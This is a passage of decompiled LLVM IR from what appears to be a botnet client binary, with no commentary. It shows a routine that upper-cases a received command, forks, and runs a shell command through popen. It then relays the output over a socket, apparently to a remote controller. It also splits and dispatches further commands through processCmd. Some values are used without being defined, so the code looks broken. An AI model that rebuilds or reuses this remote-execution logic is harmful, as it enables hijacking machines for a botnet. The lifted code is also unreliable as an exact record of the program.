  br i1 %v7_804da49, label %dec_label_pc_804da56, label %dec_label_pc_804da4d

dec_label_pc_804da4d:                             ; preds = %dec_label_pc_804da39, %dec_label_pc_804da41
  %v5_804da47240 = phi i32 [ %v5_804da47, %dec_label_pc_804da41 ], [ %v1_804d9f7, %dec_label_pc_804da39 ]
  %v4_804da44239 = phi i32 [ %v5_804da41, %dec_label_pc_804da41 ], [ %v1_804d9bc, %dec_label_pc_804da39 ]
  %stack_var_-68.1238 = phi i8* [ %v22_804da41, %dec_label_pc_804da41 ], [ %v5_804d9bf, %dec_label_pc_804da39 ]
  store i32 %v4_804da44239, i32* %eax.global-to-local, align 4
  %v2_804da50 = load i8, i8* %stack_var_-68.1238, align 1
  %v3_804da50 = zext i8 %v2_804da50 to i32
  %v6_804da50 = or i32 %v3_804da50, %v5_804da47240
  store i32 %v6_804da50, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804da52 = icmp eq i8 %v2_804da50, 0
  %v1_804da54 = icmp eq i1 %v4_804da52, false
  br i1 %v1_804da54, label %dec_label_pc_804da41, label %dec_label_pc_804da56

dec_label_pc_804da56:                             ; preds = %dec_label_pc_804da41, %dec_label_pc_804da4d, %dec_label_pc_804da39
  %stack_var_-68.1.lcssa = phi i8* [ %v5_804d9bf, %dec_label_pc_804da39 ], [ %stack_var_-68.1238, %dec_label_pc_804da4d ], [ %v22_804da41, %dec_label_pc_804da41 ]
  %v4_804da44.lcssa = phi i32 [ %v1_804d9bc, %dec_label_pc_804da39 ], [ %v4_804da44239, %dec_label_pc_804da4d ], [ %v5_804da41, %dec_label_pc_804da41 ]
  store i8 0, i8* %stack_var_-68.1.lcssa, align 1
  %v5_804da5c = add i32 %v4_804da44.lcssa, 1
  store i32 %v1_804d9bc, i32* %eax.global-to-local, align 4
  %v2_804da8a246 = load i8, i8* %v5_804d9bf, align 1
  %v3_804da8a247 = zext i8 %v2_804da8a246 to i32
  %v6_804da8a249 = or i32 %v3_804da8a247, %v1_804d9f7
  store i32 %v6_804da8a249, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804da8c250 = icmp eq i8 %v2_804da8a246, 0
  %v1_804da8e251 = icmp eq i1 %v4_804da8c250, false
  br i1 %v1_804da8e251, label %dec_label_pc_804da67, label %dec_label_pc_804da90

dec_label_pc_804da67:                             ; preds = %dec_label_pc_804da56, %dec_label_pc_804da67
  %storemerge18253 = phi i8* [ %storemerge18, %dec_label_pc_804da67 ], [ %v5_804d9bf, %dec_label_pc_804da56 ]
  %storemerge18.in252 = phi i32 [ %v5_804da84, %dec_label_pc_804da67 ], [ %v1_804d9bc, %dec_label_pc_804da56 ]
  store i32 %storemerge18.in252, i32* %eax.global-to-local, align 4
  %v2_804da6a = load i8, i8* %storemerge18253, align 1
  %v3_804da6a = zext i8 %v2_804da6a to i32
  store i32 %v3_804da6a, i32* %eax.global-to-local, align 4
  %v0_804da71 = load i32, i32* @esp, align 4
  %v5_804da71 = icmp ult i32 %v0_804da71, 12
  store i1 %v5_804da71, i1* %cf.global-to-local, align 1
  %v2_804da74 = add i32 %v0_804da71, -16
  %v3_804da74 = inttoptr i32 %v2_804da74 to i32*
  store i32 %v3_804da6a, i32* %v3_804da74, align 4
  %v2_804da75 = call i32 @__GI_toupper(i32 %storemerge18.in252)
  %v0_804da7a = load i32, i32* @esp, align 4
  %v2_804da7a = icmp ugt i32 %v0_804da7a, -17
  store i1 %v2_804da7a, i1* %cf.global-to-local, align 1
  %v1_804da7d = urem i32 %v2_804da75, 256
  %v2_804da7d = load i32, i32* @edx, align 4
  %v3_804da7d = and i32 %v2_804da7d, -256
  %v4_804da7d = or i32 %v3_804da7d, %v1_804da7d
  store i32 %v4_804da7d, i32* @edx, align 4
  %v1_804da82 = trunc i32 %v2_804da75 to i8
  store i8 %v1_804da82, i8* %storemerge18253, align 1
  %v5_804da84 = add i32 %storemerge18.in252, 1
  %storemerge18 = inttoptr i32 %v5_804da84 to i8*
  store i32 %v5_804da84, i32* %eax.global-to-local, align 4
  %v2_804da8a = load i8, i8* %storemerge18, align 1
  %v3_804da8a = zext i8 %v2_804da8a to i32
  %v5_804da8a = and i32 %v5_804da84, -256
  %v6_804da8a = or i32 %v3_804da8a, %v5_804da8a
  store i32 %v6_804da8a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804da8c = icmp eq i8 %v2_804da8a, 0
  %v1_804da8e = icmp eq i1 %v4_804da8c, false
  br i1 %v1_804da8e, label %dec_label_pc_804da67, label %dec_label_pc_804da90

dec_label_pc_804da90:                             ; preds = %dec_label_pc_804da67, %dec_label_pc_804da56
  %v22_804da5c = inttoptr i32 %v5_804da5c to i8*
  store i32 %v1_804d9bc, i32* %eax.global-to-local, align 4
  store i32 %v1_804d9bc, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8052b42.87 to i32), i32* @edi, align 4
  %v7_804dac0 = call i32 @_strncmp(i8* %v5_804d9bf, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8052b42.87, i32 0, i32 0), i32 3)
  %v8_804dac0 = urem i32 %v7_804dac0, 2
  %v9_804dac0 = icmp eq i32 %v8_804dac0, 0
  %v0_804dac2 = load i1, i1* %cf.global-to-local, align 1
  %v2_804dac2 = or i1 %v0_804dac2, %v9_804dac0
  %v3_804dac2 = zext i1 %v2_804dac2 to i32
  %v4_804dac2 = load i32, i32* @edx, align 4
  %v5_804dac2 = and i32 %v4_804dac2, -256
  %v6_804dac2 = or i32 %v3_804dac2, %v5_804dac2
  %v7_804dac2 = xor i32 %v6_804dac2, 1
  store i32 %v7_804dac2, i32* @edx, align 4
  %v3_804dac8 = and i32 %v7_804dac0, -256
  %v1_804daca = trunc i32 %v7_804dac2 to i8
  %v3_804daca = zext i1 %v0_804dac2 to i8
  %v4_804daca = sub nsw i8 %v1_804daca, %v3_804daca
  %v15_804daca = icmp eq i8 %v4_804daca, 0
  %v20_804daca = zext i8 %v4_804daca to i32
  %v23_804daca = or i32 %v20_804daca, %v3_804dac8
  store i32 %v23_804daca, i32* @ecx, align 4
  %v2_804dace = sext i8 %v4_804daca to i32
  store i32 %v2_804dace, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dad3 = icmp eq i1 %v15_804daca, false
  br i1 %v1_804dad3, label %dec_label_pc_804dbc9, label %dec_label_pc_804dad9

dec_label_pc_804dad9:                             ; preds = %dec_label_pc_804da90
  %v0_804dad9 = call i32 @listFork()
  store i32 %v0_804dad9, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dade = icmp eq i32 %v0_804dad9, 0
  %v1_804dae0 = icmp eq i1 %v1_804dade, false
  br i1 %v1_804dae0, label %dec_label_pc_804dcdd.outer30, label %dec_label_pc_804dae6

dec_label_pc_804dae6:                             ; preds = %dec_label_pc_804dad9
  store i32 %v2_804dae6, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804daf3 = load i32, i32* @esp, align 4
  %v5_804daf3 = icmp ult i32 %v0_804daf3, 4
  store i1 %v5_804daf3, i1* %cf.global-to-local, align 1
  %v2_804daf6 = add i32 %v0_804daf3, -8
  %v3_804daf6 = inttoptr i32 %v2_804daf6 to i32*
  store i32 1024, i32* %v3_804daf6, align 4
  %v1_804daf7 = add i32 %v0_804daf3, -12
  %v2_804daf7 = inttoptr i32 %v1_804daf7 to i32*
  store i32 0, i32* %v2_804daf7, align 4
  %v2_804daf9 = add i32 %v0_804daf3, -16
  %v3_804daf9 = inttoptr i32 %v2_804daf9 to i32*
  store i32 %v2_804dae6, i32* %v3_804daf9, align 4
  %v5_804dafa = call i32 @__GI_memset(i8* inttoptr (i32 3 to i8*), i32 ptrtoint ([3 x i8]* @global_var_8052b42.87 to i32), i32 %v1_804d9bc)
  %v0_804daff = load i32, i32* @esp, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_8052b45.88 to i32), i32* %eax.global-to-local, align 4
  %tmp297 = and i32 %v0_804daff, -4
  %v5_804db07 = icmp eq i32 %tmp297, -16
  store i1 %v5_804db07, i1* %cf.global-to-local, align 1
  %v6_804db0a = add i32 %v0_804daff, 8
  %v7_804db0a = inttoptr i32 %v6_804db0a to i32*
  store i32 %v5_804da5c, i32* %v7_804db0a, align 4
  %v0_804db0d = load i32, i32* %eax.global-to-local, align 4
  %v2_804db0d = add i32 %v0_804daff, 4
  %v3_804db0d = inttoptr i32 %v2_804db0d to i32*
  store i32 %v0_804db0d, i32* %v3_804db0d, align 4
  store i32 %v2_804dae6, i32* %eax.global-to-local, align 4
  %v3_804db14 = inttoptr i32 %v0_804daff to i32*
  store i32 %v2_804dae6, i32* %v3_804db14, align 4
  %v0_804db15 = call i32 @szprintf()
  %v0_804db1a = load i32, i32* @esp, align 4
  %tmp298 = and i32 %v0_804db1a, -8
  %v5_804db22 = icmp eq i32 %tmp298, -16
  store i1 %v5_804db22, i1* %cf.global-to-local, align 1
  %v2_804db25 = add i32 %v0_804db1a, 4
  %v3_804db25 = inttoptr i32 %v2_804db25 to i32*
  store i32 ptrtoint (i32* @global_var_8052b4d.89 to i32), i32* %v3_804db25, align 4
  store i32 %v2_804dae6, i32* @eax, align 4
  %v3_804db2c = inttoptr i32 %v0_804db1a to i32*
  store i32 %v2_804dae6, i32* %v3_804db2c, align 4
  %v0_804db2d = call i32 @fdpopen()
  store i32 %v0_804db2d, i32* %eax.global-to-local, align 4
  %v3_804db7e = inttoptr i32 %v0_804db2d to i8*
  br label %dec_label_pc_804db93

dec_label_pc_804db3a:                             ; preds = %dec_label_pc_804db93
  store i32 %v2_804dae6, i32* %eax.global-to-local, align 4
  %v5_804db40 = icmp ult i32 %v1_804dbaa, 12
  store i1 %v5_804db40, i1* %cf.global-to-local, align 1
  %v3_804db43 = inttoptr i32 %v0_804dbaa to i32*
  store i32 %v2_804dae6, i32* %v3_804db43, align 4
  %v0_804db44 = call i32 @trim()
  %v0_804db49 = load i32, i32* @esp, align 4
  %v0_804db4c = load i32, i32* @global_var_8055420.26, align 32
  store i32 %v0_804db4c, i32* %edx.global-to-local, align 4
  %tmp299 = and i32 %v0_804db49, -4
  %v5_804db52 = icmp eq i32 %tmp299, -16
  store i1 %v5_804db52, i1* %cf.global-to-local, align 1
  store i32 %v2_804dae6, i32* %eax.global-to-local, align 4
  %v2_804db5b = add i32 %v0_804db49, 8
  %v3_804db5b = inttoptr i32 %v2_804db5b to i32*
  store i32 %v2_804dae6, i32* %v3_804db5b, align 4
  %v1_804db5c = add i32 %v0_804db49, 4
  %v2_804db5c = inttoptr i32 %v1_804db5c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052b4f.90 to i32), i32* %v2_804db5c, align 4
  %v0_804db61 = load i32, i32* %edx.global-to-local, align 4
  %v3_804db61 = inttoptr i32 %v0_804db49 to i32*
  store i32 %v0_804db61, i32* %v3_804db61, align 4
  %v2_804db62 = call i32 @sockprintf(i32 %v0_804db2d, i32 %stack_var_-28.1.ph)
  %v0_804db67 = load i32, i32* @esp, align 4
  store i32 %v2_804dae6, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %tmp300 = and i32 %v0_804db67, -4
  %v5_804db77 = icmp eq i32 %tmp300, -16
  store i1 %v5_804db77, i1* %cf.global-to-local, align 1
  %v2_804db7a = add i32 %v0_804db67, 8
  %v3_804db7a = inttoptr i32 %v2_804db7a to i32*
  store i32 1024, i32* %v3_804db7a, align 4
  %v1_804db7b = add i32 %v0_804db67, 4
  %v2_804db7b = inttoptr i32 %v1_804db7b to i32*
  store i32 0, i32* %v2_804db7b, align 4
  %v3_804db7d = inttoptr i32 %v0_804db67 to i32*
  store i32 %v2_804dae6, i32* %v3_804db7d, align 4
  %v4_804db7e = call i32 @__GI_memset(i8* %v3_804db7e, i32 %stack_var_-28.1.ph, i32 %v2_804d2d1)
  store i32 %v4_804db7e, i32* %eax.global-to-local, align 4
  %v0_804db83 = load i32, i32* @esp, align 4
  %v1_804db83 = add i32 %v0_804db83, 16
  %v5_804db86 = icmp ult i32 %v1_804db83, 12
  store i1 %v5_804db86, i1* %cf.global-to-local, align 1
  %v2_804db89 = inttoptr i32 %v0_804db83 to i32*
  store i32 1, i32* %v2_804db89, align 4
  %v0_804db8b = call i32 @sleep()
  store i32 %v0_804db8b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804db93

dec_label_pc_804db93:                             ; preds = %dec_label_pc_804dae6, %dec_label_pc_804db3a
  %storemerge27.in.in = load i32, i32* @esp, align 4
  %tmp301 = and i32 %storemerge27.in.in, -4
  %v5_804db93 = icmp eq i32 %tmp301, -16
  store i1 %v5_804db93, i1* %cf.global-to-local, align 1
  %v5_804db96 = add i32 %storemerge27.in.in, 8
  %v6_804db96 = inttoptr i32 %v5_804db96 to i32*
  store i32 %v0_804db2d, i32* %v6_804db96, align 4
  %v1_804db99 = add i32 %storemerge27.in.in, 4
  %v2_804db99 = inttoptr i32 %v1_804db99 to i32*
  store i32 1024, i32* %v2_804db99, align 4
  store i32 %v2_804dae6, i32* %eax.global-to-local, align 4
  %v3_804dba4 = inttoptr i32 %storemerge27.in.in to i32*
  store i32 %v2_804dae6, i32* %v3_804dba4, align 4
  %v3_804dba5 = call i32 @fdgets(i32 %v0_804db2d, i32 %stack_var_-28.1.ph, i32 %v2_804d2d1)
  store i32 %v3_804dba5, i32* %eax.global-to-local, align 4
  %v0_804dbaa = load i32, i32* @esp, align 4
  %v1_804dbaa = add i32 %v0_804dbaa, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dbad = icmp eq i32 %v3_804dba5, 0
  %v1_804dbaf = icmp eq i1 %v1_804dbad, false
  br i1 %v1_804dbaf, label %dec_label_pc_804db3a, label %dec_label_pc_804dbb1

dec_label_pc_804dbb1:                             ; preds = %dec_label_pc_804db93
  %v5_804dbb1 = icmp ult i32 %v1_804dbaa, 12
  store i1 %v5_804dbb1, i1* %cf.global-to-local, align 1
  %v6_804dbb4 = inttoptr i32 %v0_804dbaa to i32*
  store i32 %v0_804db2d, i32* %v6_804dbb4, align 4
  %v0_804dbb7 = call i32 @fdpclose()
  store i32 %v0_804dbb7, i32* @eax, align 4
  %v0_804dbbc = load i32, i32* @esp, align 4
  %v1_804dbbc = add i32 %v0_804dbbc, 16
  %v5_804dbbf = icmp ult i32 %v1_804dbbc, 12
  store i1 %v5_804dbbf, i1* %cf.global-to-local, align 1
  %v2_804dbc2 = inttoptr i32 %v0_804dbbc to i32*
  store i32 0, i32* %v2_804dbc2, align 4
  %v1_804dbc4 = call i32 @__GI_exit(i32 %v0_804db2d)
  store i32 %v1_804dbc4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dbc9

dec_label_pc_804dbc9:                             ; preds = %dec_label_pc_804da90, %dec_label_pc_804dbb1
  store i32 %v5_804da5c, i32* @eax, align 4
  %v0_804dbd3 = load i32, i32* @esp, align 4
  %v5_804dbd3 = icmp ult i32 %v0_804dbd3, 8
  store i1 %v5_804dbd3, i1* %cf.global-to-local, align 1
  %v1_804dbd6 = add i32 %v0_804dbd3, -12
  %v2_804dbd6 = inttoptr i32 %v1_804dbd6 to i32*
  store i32 ptrtoint (i32* @global_var_8052b52.91 to i32), i32* %v2_804dbd6, align 4
  %v0_804dbdb = load i32, i32* @eax, align 4
  %v2_804dbdb = add i32 %v0_804dbd3, -16
  %v3_804dbdb = inttoptr i32 %v2_804dbdb to i32*
  store i32 %v0_804dbdb, i32* %v3_804dbdb, align 4
  %v1_804dbdc = load i8*, i8** %stack_var_-36, align 4
  %v2_804dbdc = ptrtoint i8* %v1_804dbdc to i32
  %v3_804dbdc = call i32 @__GI_strtok(i32 1, i32 %v2_804dbdc)
  %v0_804dbe1 = load i32, i32* @esp, align 4
  %v1_804dbe1 = add i32 %v0_804dbe1, 16
  %v5_804dbe4 = inttoptr i32 %v3_804dbdc to i8*
  store i8* %v5_804dbe4, i8** %stack_var_-36, align 4
  store i32 %v1_804d9bc, i32* %eax.global-to-local, align 4
  store i32 %v1_804d9bc, i32* %stack_var_-132, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804dc8d70 = icmp eq i32 %v3_804dbdc, 0
  %v1_804dc9177 = icmp eq i1 %v5_804dc8d70, false
  br i1 %v1_804dc9177, label %dec_label_pc_804dbf2, label %dec_label_pc_804dc97

dec_label_pc_804dbf2:                             ; preds = %dec_label_pc_804dbc9, %dec_label_pc_804dc78
  %v0_804dc78105 = phi i32 [ %v1_804dc87, %dec_label_pc_804dc78 ], [ %v1_804dbe1, %dec_label_pc_804dbc9 ]
  %v3_804dbfe = phi i8* [ %tmp192, %dec_label_pc_804dc78 ], [ %v5_804dbe4, %dec_label_pc_804dbc9 ]
  %stack_var_-40.178 = phi i32 [ %stack_var_-40.0, %dec_label_pc_804dc78 ], [ 1, %dec_label_pc_804dbc9 ]
  %v4_804dbf2 = ptrtoint i8* %v3_804dbfe to i32
  store i32 %v4_804dbf2, i32* %eax.global-to-local, align 4
  %v2_804dbf5 = load i8, i8* %v3_804dbfe, align 1
  %v3_804dbf5 = zext i8 %v2_804dbf5 to i32
  %v5_804dbf5 = and i32 %v4_804dbf2, -256
  %v6_804dbf5 = or i32 %v3_804dbf5, %v5_804dbf5
  store i32 %v6_804dbf5, i32* @eax, align 4
  %v6_804dbf7 = icmp ult i8 %v2_804dbf5, 10
  store i1 %v6_804dbf7, i1* %cf.global-to-local, align 1
  %v10_804dbf7 = icmp eq i8 %v2_804dbf5, 10
  br i1 %v10_804dbf7, label %dec_label_pc_804dc78, label %dec_label_pc_804dbfb

dec_label_pc_804dbfb:                             ; preds = %dec_label_pc_804dbf2
  store i32 %stack_var_-40.178, i32* @ebx, align 4
  store i32 %v5_804dbf5, i32* %eax.global-to-local, align 4
  store i32 %v4_804dbf2, i32* @edi, align 4
  %v3_804dc15 = call i32 @_strlen(i8* %v3_804dbfe)
  %v1_804dc19 = add i32 %v3_804dc15, 1
  store i32 %v1_804dc19, i32* %eax.global-to-local, align 4
  %v0_804dc1d = load i32, i32* @esp, align 4
  %v5_804dc1d = icmp ult i32 %v0_804dc1d, 12
  store i1 %v5_804dc1d, i1* %cf.global-to-local, align 1
  %v2_804dc20 = add i32 %v0_804dc1d, -16
  %v3_804dc20 = inttoptr i32 %v2_804dc20 to i32*
  store i32 %v1_804dc19, i32* %v3_804dc20, align 4
  %v2_804dc21 = call i32 @malloc(i32 %v4_804dbf2)
  %v0_804dc26 = load i32, i32* @esp, align 4
  %v2_804dc26 = icmp ugt i32 %v0_804dc26, -17
  store i1 %v2_804dc26, i1* %cf.global-to-local, align 1
  %v1_804dc29 = load i32, i32* @ebp, align 4
  %v2_804dc29 = load i32, i32* @ebx, align 4
  %v3_804dc29 = mul i32 %v2_804dc29, 4
  %v4_804dc29 = add i32 %v1_804dc29, -124
  %v5_804dc29 = add i32 %v4_804dc29, %v3_804dc29
  %v6_804dc29 = inttoptr i32 %v5_804dc29 to i32*
  store i32 %v2_804dc21, i32* %v6_804dc29, align 4
  %v3_804dc2d = load i8*, i8** %stack_var_-36, align 4
  %v4_804dc2d = ptrtoint i8* %v3_804dc2d to i32
  %v1_804dc3b = and i32 %v4_804dc2d, -256
  store i32 %v1_804dc3b, i32* %eax.global-to-local, align 4
  %v3_804dc44 = call i32 @_strlen(i8* %v3_804dc2d)
  %v1_804dc48 = add i32 %v3_804dc44, 1
  store i32 %v1_804dc48, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.178, i32* %eax.global-to-local, align 4
  %v0_804dc51 = load i32, i32* @ebp, align 4
  %v2_804dc51 = mul i32 %stack_var_-40.178, 4
  %v3_804dc51 = add i32 %v2_804dc51, -124
  %v4_804dc51 = add i32 %v0_804dc51, %v3_804dc51
  %v5_804dc51 = inttoptr i32 %v4_804dc51 to i32*
  %v6_804dc51 = load i32, i32* %v5_804dc51, align 4
  %v1_804dc55 = inttoptr i32 %v6_804dc51 to i8*
  store i32 %v6_804dc51, i32* @edi, align 4
  %v1_804dc5a = and i32 %v6_804dc51, -256
  store i32 %v1_804dc5a, i32* %eax.global-to-local, align 4
  %v5_804dc5c = call i8* @_memset(i8* %v1_804dc55, i32 %v1_804dc5a, i32 %v1_804dc48)
  %v6_804dc5c = ptrtoint i8* %v5_804dc5c to i32
  store i32 %v6_804dc5c, i32* @ecx, align 4
  store i32 %v4_804dc2d, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.178, i32* %eax.global-to-local, align 4
  %v0_804dc64 = load i32, i32* @ebp, align 4
  %v4_804dc64 = add i32 %v0_804dc64, %v3_804dc51
  %v5_804dc64 = inttoptr i32 %v4_804dc64 to i32*
  %v6_804dc64 = load i32, i32* %v5_804dc64, align 4
  store i32 %v6_804dc64, i32* @eax, align 4
  %v0_804dc68 = load i32, i32* @esp, align 4
  %v5_804dc68 = icmp ult i32 %v0_804dc68, 8
  store i1 %v5_804dc68, i1* %cf.global-to-local, align 1
  %v2_804dc6b = add i32 %v0_804dc68, -12
  %v3_804dc6b = inttoptr i32 %v2_804dc6b to i32*
  store i32 %v4_804dc2d, i32* %v3_804dc6b, align 4
  %v0_804dc6c = load i32, i32* @eax, align 4
  %v2_804dc6c = add i32 %v0_804dc68, -16
  %v3_804dc6c = inttoptr i32 %v2_804dc6c to i32*
  store i32 %v0_804dc6c, i32* %v3_804dc6c, align 4
  %v5_804dc6d = call i32 @strcpy(i8* %v3_804dc2d, i32 %v4_804dbf2)
  store i32 %v5_804dc6d, i32* @eax, align 4
  %v0_804dc72 = load i32, i32* @esp, align 4
  %v1_804dc72 = add i32 %v0_804dc72, 16
  %v2_804dc72 = icmp ugt i32 %v0_804dc72, -17
  store i1 %v2_804dc72, i1* %cf.global-to-local, align 1
  %v4_804dc75 = add i32 %stack_var_-40.178, 1
  br label %dec_label_pc_804dc78

dec_label_pc_804dc78:                             ; preds = %dec_label_pc_804dbf2, %dec_label_pc_804dbfb
  %v0_804dc78 = phi i32 [ %v0_804dc78105, %dec_label_pc_804dbf2 ], [ %v1_804dc72, %dec_label_pc_804dbfb ]
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.178, %dec_label_pc_804dbf2 ], [ %v4_804dc75, %dec_label_pc_804dbfb ]
  %v5_804dc78 = icmp ult i32 %v0_804dc78, 8
  store i1 %v5_804dc78, i1* %cf.global-to-local, align 1
  %v1_804dc7b = add i32 %v0_804dc78, -12
  %v2_804dc7b = inttoptr i32 %v1_804dc7b to i32*
  store i32 ptrtoint (i32* @global_var_8052b52.91 to i32), i32* %v2_804dc7b, align 4
  %v1_804dc80 = add i32 %v0_804dc78, -16
  %v2_804dc80 = inttoptr i32 %v1_804dc80 to i32*
  store i32 0, i32* %v2_804dc80, align 4
  %v1_804dc82 = load i8*, i8** %stack_var_-36, align 4
  %v2_804dc82 = ptrtoint i8* %v1_804dc82 to i32
  %v3_804dc82 = call i32 @__GI_strtok(i32 %stack_var_-40.0, i32 %v2_804dc82)
  store i32 %v3_804dc82, i32* %eax.global-to-local, align 4
  %v0_804dc87 = load i32, i32* @esp, align 4
  %v1_804dc87 = add i32 %v0_804dc87, 16
  store i32 %v3_804dc82, i32* %tmp190, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804dc8d = icmp eq i32 %v3_804dc82, 0
  %v1_804dc91 = icmp eq i1 %v5_804dc8d, false
  %tmp192 = inttoptr i32 %v3_804dc82 to i8*
  br i1 %v1_804dc91, label %dec_label_pc_804dbf2, label %dec_label_pc_804dc97

dec_label_pc_804dc97:                             ; preds = %dec_label_pc_804dc78, %dec_label_pc_804dbc9
  %v0_804dc97 = phi i32 [ %v1_804dbe1, %dec_label_pc_804dbc9 ], [ %v1_804dc87, %dec_label_pc_804dc78 ]
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_804dbc9 ], [ %stack_var_-40.0, %dec_label_pc_804dc78 ]
  %v5_804dc97 = icmp ult i32 %v0_804dc97, 8
  store i1 %v5_804dc97, i1* %cf.global-to-local, align 1
  store i32 %v2_804dc9a, i32* %eax.global-to-local, align 4
  %v2_804dc9d = add i32 %v0_804dc97, -12
  %v3_804dc9d = inttoptr i32 %v2_804dc9d to i32*
  store i32 %v2_804dc9a, i32* %v3_804dc9d, align 4
  %v5_804dc9e = add i32 %v0_804dc97, -16
  %v6_804dc9e = inttoptr i32 %v5_804dc9e to i32*
  store i32 %stack_var_-40.1.lcssa, i32* %v6_804dc9e, align 4
  %v0_804dca1 = call i32 @processCmd()
  store i32 %v0_804dca1, i32* %eax.global-to-local, align 4
  %v0_804dca6 = load i32, i32* @esp, align 4
  %v9_804dca9 = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_804dca9, i1* %cf.global-to-local, align 1
  %v7_804dcad = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_804dcad, label %dec_label_pc_804dcbf.lr.ph, label %dec_label_pc_804dcdd.outer30

dec_label_pc_804dcbf.lr.ph:                       ; preds = %dec_label_pc_804dc97
  store i32 1, i32* %eax.global-to-local, align 4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804dcbf

dec_label_pc_804dcbf:                             ; preds = %dec_label_pc_804dcbf.lr.ph, %dec_label_pc_804dcbf
  %storemerge258 = phi i32 [ 1, %dec_label_pc_804dcbf.lr.ph ], [ %v4_804dcd2, %dec_label_pc_804dcbf ]
  %v0_804dcc6257.in = phi i32 [ %v0_804dca6, %dec_label_pc_804dcbf.lr.ph ], [ %v0_804dccf, %dec_label_pc_804dcbf ]
  %v0_804dcc6257 = add i32 %v0_804dcc6257.in, 16
  store i32 %storemerge258, i32* %eax.global-to-local, align 4
  %v0_804dcc2 = load i32, i32* @ebp, align 4
  %v2_804dcc2 = mul i32 %storemerge258, 4
  %v3_804dcc2 = add i32 %v2_804dcc2, -124
  %v4_804dcc2 = add i32 %v3_804dcc2, %v0_804dcc2
  %v5_804dcc2 = inttoptr i32 %v4_804dcc2 to i32*
  %v6_804dcc2 = load i32, i32* %v5_804dcc2, align 4
  store i32 %v6_804dcc2, i32* %eax.global-to-local, align 4
  %v5_804dcc6 = icmp ult i32 %v0_804dcc6257, 12
  store i1 %v5_804dcc6, i1* %cf.global-to-local, align 1
  %v3_804dcc9 = inttoptr i32 %v0_804dcc6257.in to i32*
  store i32 %v6_804dcc2, i32* %v3_804dcc9, align 4
  %v1_804dcca = call i32 @free(i32 %storemerge258)
  %v0_804dccf = load i32, i32* @esp, align 4
  %v4_804dcd2 = add nuw nsw i32 %storemerge258, 1
  store i32 %v4_804dcd2, i32* %eax.global-to-local, align 4
  %v10_804dcd8 = icmp ult i32 %v4_804dcd2, %stack_var_-40.1.lcssa
  store i1 %v10_804dcd8, i1* %cf.global-to-local, align 1
  %v5_804dcdb = icmp slt i32 %v4_804dcd2, %stack_var_-40.1.lcssa
  br i1 %v5_804dcdb, label %dec_label_pc_804dcbf, label %dec_label_pc_804dcdd.outer

dec_label_pc_804dcdd.outer:                       ; preds = %dec_label_pc_804dcbf, %dec_label_pc_804d4ac
  %stack_var_-28.1.ph = phi i32 [ %stack_var_-28.0.ph, %dec_label_pc_804d4ac ], [ %v4_804dcd2, %dec_label_pc_804dcbf ]
  %stack_var_-52.1.ph = phi i8* [ %stack_var_-52.0.ph, %dec_label_pc_804d4ac ], [ %storemerge19216, %dec_label_pc_804dcbf ]
  %stack_var_-68.2.ph = phi i8* [ %stack_var_-68.0.ph, %dec_label_pc_804d4ac ], [ %v22_804da5c, %dec_label_pc_804dcbf ]
  %stack_var_-64.3.ph = phi i32 [ %stack_var_-64.0.ph, %dec_label_pc_804d4ac ], [ %stack_var_-64.2, %dec_label_pc_804dcbf ]
  br label %dec_label_pc_804dcdd.outer30

dec_label_pc_804dcdd.outer30:                     ; preds = %dec_label_pc_804dad9, %dec_label_pc_804dc97, %dec_label_pc_804d981, %dec_label_pc_804dcdd.outer
  %stack_var_-52.1.ph31 = phi i8* [ %stack_var_-52.1.ph, %dec_label_pc_804dcdd.outer ], [ %storemerge19216, %dec_label_pc_804dad9 ], [ %storemerge19216, %dec_label_pc_804dc97 ], [ %storemerge19.lcssa, %dec_label_pc_804d981 ]
  %stack_var_-68.2.ph32 = phi i8* [ %stack_var_-68.2.ph, %dec_label_pc_804dcdd.outer ], [ %v22_804da5c, %dec_label_pc_804dad9 ], [ %v22_804da5c, %dec_label_pc_804dc97 ], [ %tmp189, %dec_label_pc_804d981 ]
  %stack_var_-64.3.ph33 = phi i32 [ %stack_var_-64.3.ph, %dec_label_pc_804dcdd.outer ], [ %stack_var_-64.2, %dec_label_pc_804dad9 ], [ %stack_var_-64.2, %dec_label_pc_804dc97 ], [ %stack_var_-64.2, %dec_label_pc_804d981 ]
  %v2_804d913 = ptrtoint i8* %stack_var_-52.1.ph31 to i32
  br label %dec_label_pc_804dcdd.outer34

dec_label_pc_804dcdd.outer34:                     ; preds = %dec_label_pc_804dcdd.outer30, %dec_label_pc_804d94d
  %stack_var_-68.2.ph35 = phi i8* [ %stack_var_-68.2.ph32, %dec_label_pc_804dcdd.outer30 ], [ %tmp189, %dec_label_pc_804d94d ]
  %stack_var_-64.3.ph36 = phi i32 [ %stack_var_-64.3.ph33, %dec_label_pc_804dcdd.outer30 ], [ %stack_var_-64.2, %dec_label_pc_804d94d ]
  %v2_804d512 = ptrtoint i8* %stack_var_-68.2.ph35 to i32
  %v0_804dce9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804dcdd

